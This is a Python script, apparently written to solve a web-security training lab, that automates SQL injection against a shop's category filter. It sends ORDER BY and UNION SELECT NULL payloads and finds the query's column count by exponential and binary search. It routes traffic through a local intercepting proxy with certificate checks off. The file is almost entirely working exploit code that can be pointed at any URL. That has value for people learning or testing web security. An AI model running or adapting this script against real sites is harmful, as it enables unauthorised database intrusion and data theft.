#!/usr/bin/env python3
import sys
import warnings
from typing import Optional
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

FILTER_ENDPOINT = "filter"
REQUEST_TIMEOUT = (2, 5)
BURP_PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


class LabExploit:
    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update(
            {"User-Agent": "Security-Scanner-v1", "Connection": "close"}
        )
        self.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }
        self.category = "Gifts"

    def send_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        method: str = "GET",
    ) -> Optional[requests.Response]:
        """Helper hanldes all HTTP Communication"""
        target_url = urljoin(self.base_url, endpoint)
        try:
            return self.session.request(
                method,
                target_url,
                params=params,
                data=data,
                timeout=(2, 5),
                allow_redirects=True,
                proxies=self.proxies,
                verify=False,
            )
        except requests.RequestException as e:
            print(f"[-] Connection failed: {e}")
            return None

    def harvest_category(self) -> Optional[str]:
        """Harvests categories dynamically"""
        print("[*] Phase 1: Harvesting categories...")
        res = self.send_request("")
        if res is None or res.status_code != 200:
            print("[-] Failed to load home page!")
            return None
        soup = BeautifulSoup(res.text, "html.parser")
        categories = []
        for tag in soup.find_all("a", class_="filter-category"):
            tag_name = tag.get_text(strip=True)
            if "All" not in tag_name:
                categories.append(tag_name)
        return min(categories, key=len) if categories else None

    def is_valid_count(self, attack_type: str, col_count: int) -> bool:
        """Returns True if the server responds with 200 OK for the payload"""
        null_chain = ["NULL"] * col_count
        payload_fragment = (
            col_count if attack_type == "ORDER BY" else ",".join(null_chain)
        )
        payload = f"{self.category}' {attack_type} {payload_fragment}-- "
        res = self.send_request("filter", params={"category": payload})
        return res is not None and res.status_code == 200

    def find_column_count(self) -> int:
        """Uses Exponential + Binary Search to find column count"""
        # Step 1: Exponential Search for Upper Bound
        print("[*] Phase 2: Finding upper bound...")
        lower_bound = 1
        upper_bound = 1

        attack_type = "ORDER BY"
        while self.is_valid_count(attack_type, upper_bound):
            lower_bound = upper_bound
            upper_bound *= 2
            if upper_bound > 100:  # Safety break
                break

        # Step 2: Binary search within discovered range
        print(f"[*] Phase 3: Binary Searching between [{lower_bound}, {upper_bound}]")

        discovered_columns = 0
        while lower_bound <= upper_bound:
            mid = (lower_bound + upper_bound) // 2
            if self.is_valid_count(attack_type, mid):
                discovered_columns = mid
                lower_bound = mid + 1
            else:
                upper_bound = mid - 1

        # Step 3: Verify column count using UNION SELECT
        attack_type = "UNION SELECT"
        print(f"[*] Phase 4: Verifying {discovered_columns} using UNION SELECT...")
        return (
            discovered_columns
            if self.is_valid_count(attack_type, discovered_columns)
            else 0
        )

    def solve(self):
        category = self.harvest_category()
        if not category:
            print("[-] Could not find valid category!")
            return
        self.category = category
        print(f"[+] Target category identified: {category}")

        col_count = self.find_column_count()

        # Check solve state
        res = self.send_request("")
        if res is not None and "Congratulation" in res.text:
            print(f"[!] SUCCESS: Column identified: {col_count}!\nLab solved.")
        else:
            print("[-] Failed to identify column count!")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} https://web-id.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1].strip()

    exploit = LabExploit(url)
    exploit.solve()


if __name__ == "__main__":
    main()
